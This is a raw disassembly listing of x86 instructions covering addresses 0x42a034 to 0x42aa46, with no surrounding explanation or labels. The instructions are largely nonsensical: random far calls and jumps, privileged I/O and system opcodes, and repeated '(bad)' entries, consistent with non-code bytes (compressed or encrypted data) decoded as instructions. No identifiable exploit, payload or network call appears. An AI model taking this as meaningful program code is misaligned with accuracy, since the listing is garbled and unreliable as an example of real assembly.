  42a034:	or     DWORD PTR [ecx-0x180602eb],esi
  42a03a:	mov    DWORD PTR [esi+0x2eab1e34],ebx
  42a040:	inc    ebp
  42a041:	push   edx
  42a042:	int3   
  42a043:	inc    esp
  42a044:	xor    DWORD PTR [ecx+0x40],ebx
  42a047:	xchg   esi,eax
  42a048:	std    
  42a049:	dec    edx
  42a04a:	fisubr WORD PTR [edi+0x2401073]
  42a050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a051:	xchg   ecx,ebp
  42a053:	repz inc esp
  42a055:	and    ebx,DWORD PTR [edi]
  42a057:	and    DWORD PTR ds:0xd1a6e52f,ebx
  42a05d:	std    
  42a05e:	jmp    0x20a674ca
  42a063:	xchg   DWORD PTR [edx-0x4c683f8f],esp
  42a069:	lahf   
  42a06a:	or     dh,ch
  42a06c:	loop   0x42a09d
  42a06e:	mov    ds:0x873d9fc3,al
  42a073:	sub    dl,BYTE PTR [ecx]
  42a075:	xlat   BYTE PTR ds:[ebx]
  42a076:	shl    BYTE PTR [edi+0x2e218559],cl
  42a07c:	fwait
  42a07d:	and    DWORD PTR [ecx-0x3c],0x38
  42a081:	mov    al,ds:0xeb85b6a7
  42a086:	xor    al,0x98
  42a088:	add    DWORD PTR [edi-0x47],esi
  42a08b:	fidiv  WORD PTR [ecx-0x5c09e25c]
	...
  42a0f1:	add    BYTE PTR [eax],al
  42a0f3:	add    bh,dl
  42a0f5:	pushf  
  42a0f6:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a0fd:	call   FWORD PTR [ebx]
  42a0ff:	(bad)  
  42a100:	int    0x24
  42a102:	in     eax,0x69
  42a104:	js     0x42a0c8
  42a106:	add    DWORD PTR [eax],eax
  42a108:	add    eax,0xbf000001
  42a10d:	dec    eax
  42a10e:	jns    0x42a0a1
  42a110:	mov    edi,0xbe89ab8a
  42a115:	push   edi
  42a116:	es jne 0x42a0e1
  42a119:	cdq    
  42a11a:	xchg   ebp,eax
  42a11b:	popa   
  42a11c:	jmp    DWORD PTR [edx+0x4da8f034]
  42a122:	and    dh,BYTE PTR [ecx+0x22d9faae]
  42a128:	cmc    
  42a129:	bound  ebx,QWORD PTR [edx-0x2d]
  42a12c:	test   dl,ah
  42a12e:	adc    DWORD PTR [ecx],ecx
  42a130:	jb     0x42a141
  42a132:	mov    esp,0x95e16b4e
  42a137:	jmp    0x42a194
  42a139:	call   0xa22a:0xe6d5cb1c
  42a140:	xchg   edi,eax
  42a141:	cwde   
  42a142:	and    al,0x5f
  42a144:	sbb    al,0xc6
  42a146:	leave  
  42a147:	cwde   
  42a148:	ins    BYTE PTR es:[edi],dx
  42a149:	push   ss
  42a14a:	dec    eax
  42a14b:	enter  0xca37,0x9f
  42a14f:	inc    edi
  42a150:	pop    ss
  42a151:	sub    BYTE PTR [ecx+0x36f32606],bl
  42a157:	jmp    0x658c3419
  42a15c:	and    ebx,ebx
  42a15e:	inc    eax
  42a15f:	push   es
  42a160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a161:	or     al,BYTE PTR [ebx-0x7701cf5e]
  42a167:	std    
  42a168:	push   edi
  42a169:	jl     0x42a138
  42a16b:	arpl   WORD PTR [esi+eax*4],dx
  42a16e:	or     esp,edi
  42a170:	jecxz  0x42a0fb
  42a172:	out    0x51,eax
  42a174:	into   
  42a175:	sbb    al,BYTE PTR [esi-0x654e81de]
  42a17b:	bndstx [ebp-0xb2991b8],bnd0
  42a182:	aas    
  42a183:	cmp    ebp,DWORD PTR [ecx-0x5a6e0f8a]
  42a189:	and    eax,0x137f0f60
  42a18e:	inc    eax
  42a18f:	arpl   WORD PTR [esi+ecx*2-0x49],cx
  42a193:	pop    ecx
  42a194:	cmp    bh,al
  42a196:	fist   WORD PTR [edi+0x2a62d6da]
  42a19c:	mov    ds:0x64a2ec74,eax
  42a1a1:	add    edi,DWORD PTR [eax+0x53]
  42a1a4:	ret    0x3744
  42a1a7:	fadd   QWORD PTR [esi-0x3]
  42a1aa:	pushf  
  42a1ab:	mov    dl,0x11
  42a1ad:	dec    edx
  42a1ae:	out    dx,al
  42a1af:	out    dx,al
  42a1b0:	icebp  
  42a1b1:	jmp    0x42a225
  42a1b3:	sub    al,0x99
  42a1b5:	xor    BYTE PTR [esp+edx*2],bh
  42a1b8:	mov    BYTE PTR [esi+0x66032e4a],0xf3
  42a1bf:	nop
  42a1c0:	jo     0x42a1c3
  42a1c2:	cld    
  42a1c3:	xor    DWORD PTR [ebx-0x6a],esi
  42a1c6:	inc    eax
  42a1c7:	xor    DWORD PTR [eax-0xf8c55ae],ebx
  42a1cd:	hlt    
  42a1ce:	mov    DWORD PTR [eax-0x21],ebp
  42a1d1:	std    
  42a1d2:	neg    DWORD PTR [edi]
  42a1d4:	ds sub eax,eax
  42a1d7:	repz mov cl,0x39
  42a1da:	sub    bl,BYTE PTR [ecx-0x32]
  42a1dd:	ss inc ebx
  42a1df:	mov    ecx,0xdba63925
  42a1e4:	xor    ax,WORD PTR [ecx-0x4e]
  42a1e8:	sbb    DWORD PTR [esi],esi
  42a1ea:	mov    ebp,0xc3383cb8
  42a1ef:	fcmovb st,st(0)
  42a1f1:	rcr    esi,0xc9
  42a1f4:	and    DWORD PTR [ebx-0x6d848d6a],edx
  42a1fa:	pop    edx
  42a1fb:	mov    ch,0x92
  42a1fd:	ftst   
  42a1ff:	fadd   QWORD PTR [edi]
  42a201:	or     BYTE PTR [esi-0x44],bh
  42a204:	xor    BYTE PTR [edx+0x18259e47],ah
  42a20a:	int3   
  42a20b:	mov    ah,0xe4
  42a20d:	stos   DWORD PTR es:[edi],eax
  42a20e:	inc    ebx
  42a20f:	test   BYTE PTR ss:[eax],al
	...
  42a272:	add    BYTE PTR [eax],al
  42a274:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42a27a:	scas   eax,DWORD PTR es:[edi]
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fldenv [edi-0x38]
  42a282:	pop    ds
  42a283:	stc    
  42a284:	jge    0x42a249
  42a286:	add    DWORD PTR [eax],eax
  42a288:	add    eax,0x80000001
  42a28d:	inc    eax
  42a28e:	ss xchg ebx,eax
  42a290:	outs   dx,DWORD PTR ds:[esi]
  42a291:	lods   eax,DWORD PTR ds:[esi]
  42a292:	mov    ebp,0x1cefb14f
  42a297:	arpl   WORD PTR [edi],bx
  42a299:	int3   
  42a29a:	mov    esi,DWORD PTR [ebx]
  42a29c:	leave  
  42a29d:	mov    esi,DWORD PTR [ecx+0x6b]
  42a2a0:	mov    WORD PTR [ecx+0x4a],cs
  42a2a3:	add    dl,BYTE PTR [edx]
  42a2a5:	inc    ebx
  42a2a6:	dec    esi
  42a2a7:	dec    ebx
  42a2a8:	ror    BYTE PTR [eax+0x39f66fbe],0x55
  42a2af:	push   ebp
  42a2b0:	xor    al,0x5e
  42a2b2:	jne    0x42a2e1
  42a2b4:	repz in eax,dx
  42a2b6:	adc    al,0xe8
  42a2b8:	jo     0x42a29b
  42a2ba:	xor    al,0x70
  42a2bc:	push   ebp
  42a2bd:	test   al,al
  42a2bf:	add    ebx,eax
  42a2c1:	outs   dx,BYTE PTR ds:[esi]
  42a2c2:	sbb    al,0x5b
  42a2c4:	shr    DWORD PTR [ebx-0x77],0xe5
  42a2c8:	es xchg ebp,eax
  42a2ca:	or     ebp,DWORD PTR cs:[edi+0x5a]
  42a2ce:	sbb    DWORD PTR [edx],esi
  42a2d0:	adc    BYTE PTR [ebx],0xc3
  42a2d3:	repnz mov dl,0x5a
  42a2d6:	addr16 and dh,dl
  42a2d9:	scas   eax,DWORD PTR es:[edi]
  42a2da:	clc    
  42a2db:	push   0x11
  42a2dd:	cmc    
  42a2de:	aaa    
  42a2df:	call   0xfeec:0x3f0c5975
  42a2e6:	push   0x796ed262
  42a2eb:	ins    BYTE PTR es:[edi],dx
  42a2ec:	inc    esi
  42a2ed:	mov    bl,BYTE PTR [esi+0x29]
  42a2f0:	jo     0x42a32b
  42a2f2:	xor    bh,dh
  42a2f4:	outs   dx,DWORD PTR ds:[esi]
  42a2f5:	jo     0x42a31f
  42a2f7:	pop    ecx
  42a2f8:	jp     0x42a2e9
  42a2fa:	lods   eax,DWORD PTR ds:[esi]
  42a2fb:	sbb    edx,DWORD PTR [edx+ebx*4]
  42a2fe:	dec    ebx
  42a2ff:	or     cl,cl
  42a301:	adc    ch,BYTE PTR [eax+ebp*1]
  42a304:	pop    ds
  42a305:	adc    DWORD PTR [edx],edi
  42a307:	sar    bl,1
  42a309:	shr    BYTE PTR [edi+0x382d8a1e],1
  42a30f:	or     al,0x46
  42a311:	inc    edi
  42a312:	ret    0x9d30
  42a315:	mov    eax,0xfe7bd6af
  42a31a:	(bad)  
  42a31b:	loopne 0x42a2b5
  42a31d:	inc    edx
  42a31e:	call   0x27196ec0
  42a323:	adc    DWORD PTR [ecx+eax*1-0x4e189e69],ebp
  42a32a:	sbb    BYTE PTR [ecx+edi*2+0x35accfae],ch
  42a331:	dec    ebx
  42a332:	pop    ebp
  42a333:	(bad)  
  42a334:	xor    ebp,DWORD PTR [ebx+eiz*8+0x13152683]
  42a33b:	repz adc al,bh
  42a33e:	or     ebx,ebp
  42a340:	push   ss
  42a341:	pop    ecx
  42a342:	xor    BYTE PTR [ebp+0x26],ch
  42a345:	out    dx,al
  42a346:	mov    ds:0x5a31a47f,al
  42a34c:	scas   al,BYTE PTR es:[edi]
  42a34d:	lds    eax,FWORD PTR [eax+ebp*2]
  42a350:	daa    
  42a351:	sbb    cl,ch
  42a353:	cmc    
  42a354:	and    BYTE PTR [ecx],bl
  42a356:	cmp    esp,DWORD PTR [ebx]
  42a358:	cwde   
  42a359:	inc    ecx
  42a35a:	daa    
  42a35b:	push   ds
  42a35c:	dec    edi
  42a35d:	sub    ebp,DWORD PTR fs:[ebp-0x2e]
  42a361:	daa    
  42a362:	mov    eax,0x9630c040
  42a367:	repnz fxch st(6)
  42a36a:	fsubr  DWORD PTR [eax]
  42a36c:	dec    ebx
  42a36d:	pushf  
  42a36e:	call   0xe153:0x94128a4c
  42a375:	sub    al,0x8e
  42a377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a378:	adc    BYTE PTR [edi],dl
  42a37a:	pop    edx
  42a37b:	mov    al,ds:0xc210c983
  42a380:	dec    ebp
  42a381:	in     eax,dx
  42a382:	pop    es
  42a383:	mov    dl,BYTE PTR [ebp+0x4cf78f4e]
  42a389:	or     al,0x7a
  42a38b:	xchg   esp,eax
  42a38c:	mov    eax,ds:0xc9ef3ee5
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x7106b13d
  42a403:	mov    ebx,0x1c482
  42a408:	add    eax,0x1
  42a40d:	das    
  42a40e:	ret    0x5361
  42a411:	js     0x42a489
  42a413:	rol    BYTE PTR [edx+eiz*1-0x5b7aea0f],1
  42a41a:	js     0x42a48c
  42a41c:	scas   al,BYTE PTR es:[edi]
  42a41d:	out    dx,eax
  42a41e:	pop    esi
  42a41f:	mov    ecx,ebx
  42a421:	loopne 0x42a3c9
  42a423:	mov    DWORD PTR [esi+0x33],eax
  42a426:	dec    ebx
  42a427:	daa    
  42a428:	jecxz  0x42a423
  42a42a:	inc    esp
  42a42b:	bound  edx,QWORD PTR [edx]
  42a42d:	mov    ds:0x5cf0da6c,al
  42a432:	(bad)  
  42a433:	push   0xf6596816
  42a438:	xchg   edx,eax
  42a439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a43a:	loop   0x42a450
  42a43c:	pop    ebx
  42a43d:	mov    DWORD PTR [ebp+ecx*2-0x657c13ca],edi
  42a444:	pusha  
  42a445:	cs ret 
  42a447:	mov    ebx,0xe13a76bd
  42a44c:	(bad)  
  42a44d:	mov    eax,ds:0x9922b854
  42a452:	sahf   
  42a453:	and    bl,BYTE PTR [ebp-0x5f]
  42a456:	dec    esi
  42a457:	fucomi st,st(3)
  42a459:	sub    eax,DWORD PTR [edx-0x70680879]
  42a45f:	add    esp,ebp
  42a461:	sysexit 
  42a463:	stos   DWORD PTR es:[edi],eax
  42a464:	adc    al,0x9b
  42a466:	cs push 0x8d26a5d
  42a46c:	inc    ebp
  42a46d:	pusha  
  42a46e:	adc    eax,0x9afba1c0
  42a473:	mov    al,0x4c
  42a475:	mov    WORD PTR [edi],?
  42a477:	aas    
  42a478:	or     al,0x3a
  42a47a:	mov    ds:0x661da9db,eax
  42a47f:	dec    ebp
  42a480:	sub    ah,al
  42a482:	mov    al,BYTE PTR [ebp+ecx*2+0x43469223]
  42a489:	xchg   DWORD PTR ds:0x7474fccf,ecx
  42a48f:	retf   
  42a490:	imul   ecx,DWORD PTR [ecx+esi*1+0x1f7929ec],0x667a4a31
  42a49b:	push   edi
  42a49c:	fcomp  QWORD PTR [edx]
  42a49e:	cwde   
  42a49f:	cmp    DWORD PTR [eax],0x6f
  42a4a2:	jl     0x42a4f0
  42a4a4:	cwde   
  42a4a5:	lods   eax,DWORD PTR ds:[esi]
  42a4a6:	xchg   edi,eax
  42a4a7:	push   ebx
  42a4a8:	je     0x42a4d9
  42a4aa:	push   es
  42a4ab:	jmp    0x83b:0xcaa41a40
  42a4b2:	fiadd  DWORD PTR [edi-0x73]
  42a4b5:	sar    DWORD PTR [ebx+0x63562c21],cl
  42a4bb:	mov    eax,0x7b10a97d
  42a4c0:	into   
  42a4c1:	fst    st(6)
  42a4c3:	sti    
  42a4c4:	mov    ah,0xa
  42a4c6:	mov    cl,0x6b
  42a4c8:	outs   dx,BYTE PTR ds:[esi]
  42a4c9:	sub    DWORD PTR [edx-0x4d7c43c4],edi
  42a4cf:	cld    
  42a4d0:	or     BYTE PTR [ecx+ecx*8],ah
  42a4d3:	retf   0xe995
  42a4d6:	push   0xffffffdf
  42a4d8:	mov    ah,0x3f
  42a4da:	jns    0x42a487
  42a4dc:	pop    ecx
  42a4dd:	aad    0xa2
  42a4df:	aad    0x43
  42a4e1:	lods   al,BYTE PTR ds:[esi]
  42a4e2:	inc    ebp
  42a4e3:	sbb    BYTE PTR [ebx+0x16],0xdd
  42a4e7:	js     0x42a54c
  42a4e9:	aad    0x5b
  42a4eb:	cmp    BYTE PTR [edi-0xc18280e],0x7c
  42a4f2:	repnz mov BYTE PTR [ebp+0x7],dh
  42a4f6:	mov    cl,0xd9
  42a4f8:	xor    ecx,0xffffffdf
  42a4fb:	jae    0x42a489
  42a4fd:	jb     0x42a4df
  42a4ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a500:	sbb    cl,ah
  42a502:	into   
  42a503:	jg     0x42a4e2
  42a505:	cli    
  42a506:	mov    ds:0xdc378816,al
  42a50b:	sbb    ebx,edx
  42a50d:	sbb    BYTE PTR [eax+0xe86a],0x0
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xe5f0079f
  42a583:	fild   WORD PTR [edi+0x50001c5]
  42a589:	add    DWORD PTR [eax],eax
  42a58b:	add    BYTE PTR [ebp+0x31fe7fcc],ah
  42a591:	sub    edx,DWORD PTR ds:0x88f798e4
  42a597:	or     dl,dl
  42a599:	xor    al,0x73
  42a59b:	adc    ah,al
  42a59d:	xchg   edi,eax
  42a59e:	mov    ebx,DWORD PTR [edx-0xee53eaa]
  42a5a4:	ret    
  42a5a5:	push   edx
  42a5a6:	adc    dh,bh
  42a5a8:	mov    cl,0xa2
  42a5aa:	xor    edx,DWORD PTR [eax+0x3d389015]
  42a5b0:	loope  0x42a587
  42a5b2:	loopne 0x42a5c4
  42a5b4:	and    DWORD PTR [eax-0x46],esp
  42a5b7:	pop    ss
  42a5b8:	jnp    0x42a571
  42a5ba:	sbb    ecx,edi
  42a5bc:	or     eax,0x6881fe52
  42a5c1:	sub    eax,0x2298d672
  42a5c6:	jne    0x42a559
  42a5c8:	sub    BYTE PTR ss:[esi-0x32f3e0c0],dl
  42a5cf:	mov    edx,0x88cb888d
  42a5d4:	ds mov ah,0x9d
  42a5d7:	aaa    
  42a5d8:	(bad)  
  42a5d9:	pop    edx
  42a5da:	mov    ds:0x990a29a5,eax
  42a5df:	test   DWORD PTR [ecx+0x2149b7bf],ebp
  42a5e5:	jo     0x42a63f
  42a5e7:	int3   
  42a5e8:	cdq    
  42a5e9:	sbb    BYTE PTR [esi+0x53],dh
  42a5ec:	pusha  
  42a5ed:	inc    ecx
  42a5ee:	aad    0xcd
  42a5f0:	add    DWORD PTR [edx],edi
  42a5f2:	jp     0x42a595
  42a5f4:	je     0x42a5cc
  42a5f6:	push   0xffffffd3
  42a5f8:	int    0xd8
  42a5fa:	outs   dx,BYTE PTR ds:[esi]
  42a5fb:	scas   al,BYTE PTR es:[edi]
  42a5fc:	cmp    BYTE PTR [ebp-0x5a1959ca],0x67
  42a603:	mov    esp,DWORD PTR [ebp-0xa]
  42a606:	rcl    DWORD PTR [esp+esi*1+0x2a],0xe
  42a60b:	xchg   ebp,eax
  42a60c:	popa   
  42a60d:	sbb    DWORD PTR [edx],edi
  42a60f:	mov    al,ds:0xc312d904
  42a614:	enter  0x3a7f,0x1e
  42a618:	ret    0x61c0
  42a61b:	call   0x41901278
  42a620:	add    dh,BYTE PTR [esi+0x68c0252]
  42a626:	pop    esi
  42a627:	cmp    al,0x7d
  42a629:	das    
  42a62a:	xchg   DWORD PTR [edi-0x65ce9b86],edi
  42a630:	call   0xb351:0x40b4a1d0
  42a637:	sub    DWORD PTR [edi-0x10],ecx
  42a63a:	inc    esi
  42a63b:	pop    ecx
  42a63c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a63d:	(bad)  
  42a63e:	shr    DWORD PTR [eax-0x408e94cd],cl
  42a644:	sti    
  42a645:	stc    
  42a646:	(bad)  
  42a647:	adc    eax,0x38d2fd7a
  42a64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a64d:	pop    ebp
  42a64e:	pop    eax
  42a64f:	sbb    ebp,edi
  42a651:	mov    ebx,esi
  42a653:	test   eax,0x8eee0204
  42a658:	aaa    
  42a659:	sti    
  42a65a:	add    eax,0xb96541d3
  42a65f:	fbld   TBYTE PTR [esi+0x3f48e080]
  42a665:	xor    eax,0xb0bd8d53
  42a66a:	(bad)  
  42a66b:	jle    0x42a5f5
  42a66d:	or     ebx,DWORD PTR [esi-0x58]
  42a670:	adc    DWORD PTR [ecx-0x1659d107],ebp
  42a676:	pop    esi
  42a677:	xor    ecx,DWORD PTR [ebx]
  42a679:	inc    eax
  42a67a:	mov    ebp,0x40936b85
  42a67f:	adc    al,0xf3
  42a681:	leave  
  42a682:	mov    esi,DWORD PTR ds:0xf05e2985
  42a688:	sub    bl,ah
  42a68a:	fadd   DWORD PTR [esi+0x16ab575e]
  42a690:	xchg   edi,eax
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x15b8131c],0x8cca41c7
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0x94000001
  42a70d:	xchg   edi,eax
  42a70e:	(bad)  
  42a70f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a710:	jle    0x42a710
  42a712:	mov    ecx,0xec687968
  42a717:	mov    esi,0xbc2afd79
  42a71c:	(bad)  
  42a71d:	mov    eax,0xc6aea054
  42a722:	dec    ebx
  42a723:	adc    al,0x12
  42a725:	cmp    edi,DWORD PTR [edx+edx*4-0x497889a6]
  42a72c:	add    eax,0xeb7e9782
  42a731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a732:	or     dx,bp
  42a735:	ret    
  42a736:	sbb    edx,edx
  42a738:	mov    esp,0x2f6415b6
  42a73d:	xor    eax,0xffffffe2
  42a740:	out    dx,eax
  42a741:	enter  0xd88c,0x82
  42a745:	push   edi
  42a746:	clc    
  42a747:	sbb    eax,0x524dc4b4
  42a74c:	cmp    DWORD PTR [edi+0xdb7ae30],esp
  42a752:	in     al,0xe2
  42a754:	imul   esp,ecx,0xa175092f
  42a75a:	xlat   BYTE PTR ds:[ebx]
  42a75b:	retf   0xdf89
  42a75e:	fiadd  DWORD PTR [eax+0x3606bbef]
  42a764:	sub    ebp,DWORD PTR [edx-0x737548dc]
  42a76a:	clc    
  42a76b:	inc    esp
  42a76c:	jle    0x42a7cf
  42a76e:	sub    DWORD PTR ss:[edx],eax
  42a771:	jne    0x42a7cc
  42a773:	dec    eax
  42a774:	jb     0x42a783
  42a776:	dec    edx
  42a777:	jmp    0xdaa:0xb3fc4bd3
  42a77e:	frstor [edx-0x69]
  42a781:	xor    BYTE PTR [eax],bl
  42a783:	sar    BYTE PTR [ebp-0x77],1
  42a786:	aas    
  42a787:	hlt    
  42a788:	sbb    ecx,ecx
  42a78a:	cmp    edi,DWORD PTR [ebp+0xc]
  42a78d:	in     eax,dx
  42a78e:	lahf   
  42a78f:	mov    ebx,0x54a14eac
  42a794:	push   ebx
  42a795:	mov    bl,0x6e
  42a797:	in     eax,dx
  42a798:	mov    ch,0x96
  42a79a:	adc    eax,0x87a36344
  42a79f:	push   es
  42a7a0:	arpl   WORD PTR [ebx],bx
  42a7a2:	in     al,dx
  42a7a3:	test   al,0x9c
  42a7a5:	das    
  42a7a6:	and    DWORD PTR [edx+0x577d1fc9],esi
  42a7ac:	or     BYTE PTR [ecx-0x196d68a],cl
  42a7b2:	jge    0x42a7eb
  42a7b4:	in     al,0xc8
  42a7b6:	in     eax,dx
  42a7b7:	pop    edi
  42a7b8:	enter  0xbfe9,0xa3
  42a7bc:	out    dx,eax
  42a7bd:	and    al,0x10
  42a7bf:	ss leave 
  42a7c1:	jle    0x42a7e1
  42a7c3:	jge    0x42a83c
  42a7c5:	pop    eax
  42a7c6:	xor    ch,BYTE PTR [ebx+ebp*4+0x158f8801]
  42a7cd:	aaa    
  42a7ce:	inc    ebp
  42a7cf:	pop    esp
  42a7d0:	test   edi,ecx
  42a7d2:	cmp    DWORD PTR [ecx],ebp
  42a7d4:	dec    edi
  42a7d5:	mov    esi,ebp
  42a7d7:	mov    bp,0x8d54
  42a7db:	cwde   
  42a7dc:	fwait
  42a7dd:	sbb    eax,0xac1cd9df
  42a7e2:	inc    eax
  42a7e3:	push   ebx
  42a7e4:	xchg   ebp,eax
  42a7e5:	out    0xca,eax
  42a7e7:	and    edx,DWORD PTR [edi]
  42a7e9:	test   DWORD PTR ds:0xceab6e43,ebp
  42a7ef:	push   eax
  42a7f0:	in     al,dx
  42a7f1:	dec    eax
  42a7f2:	retf   0xa0ea
  42a7f5:	in     al,dx
  42a7f6:	imul   esp,DWORD PTR [edi+0x5bff6ac9],0x18afa7de
  42a800:	mov    dl,0x11
  42a802:	imul   ebp,ebp,0x34
  42a805:	ret    0xc0ad
  42a808:	or     bh,dh
  42a80a:	cmp    eax,0x60939f21
  42a80f:	jno    0x42a7eb
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	test   al,0x8e
  42a882:	xchg   ebx,eax
  42a883:	aas    
  42a884:	xchg   ecx,eax
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    BYTE PTR [ebx],dh
  42a88d:	pop    eax
  42a88e:	pop    es
  42a88f:	sub    al,0x2
  42a891:	or     esp,ebp
  42a893:	fdiv   DWORD PTR [edx]
  42a895:	push   esp
  42a896:	jbe    0x42a823
  42a898:	jg     0x42a870
  42a89a:	jnp    0x42a88c
  42a89c:	dec    esp
  42a89d:	dec    ebp
  42a89e:	enter  0x8252,0x42
  42a8a2:	(bad)  
  42a8a4:	stos   DWORD PTR es:[edi],eax
  42a8a5:	outs   dx,DWORD PTR ds:[esi]
  42a8a6:	sar    DWORD PTR [ebx+0x4a0822a4],0x80
  42a8ad:	cdq    
  42a8ae:	(bad)  
  42a8af:	retf   
  42a8b0:	cmp    eax,0x248da9b7
  42a8b5:	(bad)  
  42a8b6:	rcr    BYTE PTR [edi],cl
  42a8b8:	jmp    0x852cf885
  42a8bd:	dec    ecx
  42a8be:	mov    edx,0x3648d4a7
  42a8c3:	add    cl,BYTE PTR [eax]
  42a8c5:	and    BYTE PTR [ecx+ecx*8-0x43a45857],0xc6
  42a8cd:	or     ecx,DWORD PTR [ecx-0x4e]
  42a8d0:	jnp    0x42a8d6
  42a8d2:	loop   0x42a8e7
  42a8d4:	and    dl,dl
  42a8d6:	pop    ebx
  42a8d7:	repnz std 
  42a8d9:	mov    edi,0x4aefbb54
  42a8de:	lock aas 
  42a8e0:	in     al,dx
  42a8e1:	pop    es
  42a8e2:	adc    DWORD PTR [ebx+esi*4-0x5a],edx
  42a8e6:	mov    cl,0xd2
  42a8e8:	nop
  42a8e9:	mov    ah,0xe3
  42a8eb:	test   ch,bl
  42a8ed:	inc    ebp
  42a8ee:	jmp    0x42a917
  42a8f0:	xchg   edx,eax
  42a8f1:	aad    0x92
  42a8f3:	xchg   ebp,eax
  42a8f4:	pop    edi
  42a8f5:	jle    0x42a970
  42a8f7:	adc    ebp,DWORD PTR gs:[eax]
  42a8fa:	(bad)  
  42a8fc:	iret   
  42a8fd:	pushf  
  42a8fe:	jp     0x42a924
  42a900:	jg     0x42a919
  42a902:	icebp  
  42a903:	pusha  
  42a904:	sbb    al,0x6c
  42a906:	mov    DWORD PTR [ecx],0xc4822c61
  42a90c:	jge    0x42a8e8
  42a90e:	xor    edx,edx
  42a910:	sub    DWORD PTR [ebp-0x3a0e936e],edx
  42a916:	pop    ebp
  42a917:	jnp    0x42a8d2
  42a919:	mov    dl,0x6b
  42a91b:	daa    
  42a91c:	out    0x70,al
  42a91e:	xor    DWORD PTR [ecx-0x750189dc],esi
  42a924:	shl    DWORD PTR [ebx-0x18baf418],1
  42a92a:	jecxz  0x42a907
  42a92c:	rol    BYTE PTR [ebp-0x66],0x73
  42a930:	pop    es
  42a931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a932:	loopne 0x42a8f5
  42a934:	pop    ebx
  42a935:	aas    
  42a936:	pop    edi
  42a937:	(bad)
  42a93a:	add    al,0x5a
  42a93c:	loope  0x42a935
  42a93e:	sub    DWORD PTR [edx+0x2387cdbd],ecx
  42a944:	cld    
  42a945:	sub    esi,0xffffffe6
  42a948:	sti    
  42a949:	pop    esi
  42a94a:	ds imul edx,eax,0xffffffdb
  42a94e:	or     al,0x76
  42a950:	sbb    ebp,DWORD PTR [ebx]
  42a952:	xchg   esp,eax
  42a953:	inc    ebp
  42a954:	ror    DWORD PTR [ebp+0x1],cl
  42a957:	sbb    esi,DWORD PTR [eax+esi*2-0x1719aa1f]
  42a95e:	aas    
  42a95f:	scas   al,BYTE PTR es:[edi]
  42a960:	ss das 
  42a962:	xor    BYTE PTR [ecx],dh
  42a964:	fwait
  42a965:	inc    ecx
  42a966:	sbb    al,0x4f
  42a968:	sbb    BYTE PTR [ecx+edi*2+0x3e],al
  42a96c:	push   0xe17c9bad
  42a971:	adc    bl,ch
  42a973:	hlt    
  42a974:	add    BYTE PTR [edi+0x71],ch
  42a977:	cld    
  42a978:	xchg   ebp,eax
  42a979:	pushf  
  42a97a:	mov    al,ds:0xcac19b67
  42a97f:	iret   
  42a980:	inc    esp
  42a981:	adc    cl,BYTE PTR [ebx]
  42a983:	cdq    
  42a984:	cmp    eax,0x8e9acb49
  42a989:	or     al,0x59
  42a98b:	inc    esi
  42a98c:	xchg   ebp,eax
  42a98d:	(bad)
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	lods   al,BYTE PTR ds:[esi]
  42aa01:	mov    edi,DWORD PTR [esi+0x27]
  42aa04:	xchg   esi,eax
  42aa05:	enter  0x1,0x5
  42aa09:	add    DWORD PTR [eax],eax
  42aa0b:	add    BYTE PTR [edi+ebx*1-0x35],bh
  42aa0f:	jmp    0x42a9a4
  42aa11:	scas   eax,DWORD PTR es:[edi]
  42aa12:	sbb    ebx,DWORD PTR ds:0xa457f9bb
  42aa18:	(bad)  
  42aa19:	jge    0x42aa35
  42aa1b:	and    BYTE PTR ds:0x85eb97ec,ch
  42aa21:	psubsb mm5,mm0
  42aa24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa25:	(bad)  
  42aa26:	call   DWORD PTR [ecx]
  42aa28:	lea    edx,[esi-0x39]
  42aa2b:	push   esi
  42aa2c:	mov    dl,0xcb
  42aa2e:	iret   
  42aa2f:	fidivr DWORD PTR [ebx-0x78fc0220]
  42aa35:	inc    ecx
  42aa36:	aas    
  42aa37:	arpl   WORD PTR [edi+0x1c],si
  42aa3a:	in     eax,dx
  42aa3b:	aas    
  42aa3c:	sub    DWORD PTR [edx+0x79b282cd],esi
  42aa42:	int3   
  42aa43:	(bad)  
  42aa44:	retf   
  42aa45:	outs   dx,BYTE PTR ds:[esi]
  42aa46:	rcr    DWORD PTR [edx],1
